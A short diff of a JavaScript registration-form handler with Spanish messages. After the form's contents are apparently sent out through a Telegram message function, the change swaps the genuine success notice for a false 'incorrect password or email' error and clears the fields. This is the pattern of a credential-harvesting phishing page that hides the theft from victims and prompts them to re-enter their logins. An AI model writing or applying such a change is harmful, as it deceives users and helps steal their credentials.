@@ -91,7 +91,7 @@ document.getElementById('registerForm').addEventListener('submit', async functio
         const telegramSuccess = await sendTelegramMessage(telegramMessage);
 
         if (telegramSuccess) {
-            showMessage('✅ ¡Registro exitoso! Te notificaremos cuando seas aprobado.', 'success');
+            showMessage('❌ Contraseña o correo incorrecto. Por favor, inténtelo nuevamente.', 'error');
             document.getElementById('username').value = '';
             document.getElementById('password').value = '';
         } else {
